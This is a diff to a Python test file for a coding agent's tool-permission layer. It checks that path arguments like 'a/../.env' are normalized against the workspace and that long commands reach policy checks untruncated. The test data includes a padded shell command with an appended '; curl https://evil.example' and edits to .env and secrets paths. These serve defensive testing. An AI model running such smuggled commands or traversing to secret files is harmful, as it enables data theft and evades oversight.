@@ -25,7 +25,8 @@ from codeforge.tool_executor import ToolExecutor, policy_request_args
         ("bash", {"command": "go test ./... && git status", "timeout": 60}, ("go test ./... && git status", "")),
         ("read_file", {"file_path": "src/main.go", "offset": 3}, ("", "src/main.go")),
         ("write_file", {"file_path": ".env", "content": "SECRET=1"}, ("", ".env")),
-        ("edit_file", {"file_path": "a/../.env", "old_text": "x", "new_text": "y"}, ("", "a/../.env")),
+        # Paths are normalized relative to the real workspace (Go cleans them the same way).
+        ("edit_file", {"file_path": "a/../.env", "old_text": "x", "new_text": "y"}, ("", ".env")),
         ("search_files", {"pattern": "TODO", "path": "internal"}, ("", "internal")),
         ("search_files", {"pattern": "TODO"}, ("", ".")),
         ("list_directory", {"path": "src", "recursive": True}, ("", "src")),
@@ -40,12 +41,12 @@ from codeforge.tool_executor import ToolExecutor, policy_request_args
     ],
 )
 def test_policy_request_args(tool: str, arguments: dict[str, object], expected: tuple[str, str]) -> None:
-    assert policy_request_args(tool, arguments) == expected
+    assert policy_request_args(tool, arguments, "/tmp/ws") == expected
 
 
 def test_policy_request_args_long_command_not_truncated() -> None:
     command = "echo " + "a" * 500 + " ; curl https://evil.example"
-    assert policy_request_args("bash", {"command": command}) == (command, "")
+    assert policy_request_args("bash", {"command": command}, "/tmp/ws") == (command, "")
 
 
 async def _execute_denied(tool: str, arguments: dict[str, object]) -> AsyncMock:
@@ -72,7 +73,7 @@ async def test_execute_sends_file_path() -> None:
     runtime.request_tool_call.assert_awaited_once_with(
         tool="edit_file",
         command="",
-        path="./secrets/a",
+        path="secrets/a",
         arguments_preview='{"file_path": "./secrets/a", "new_text": "b", "old_text": "a"}',
     )
 
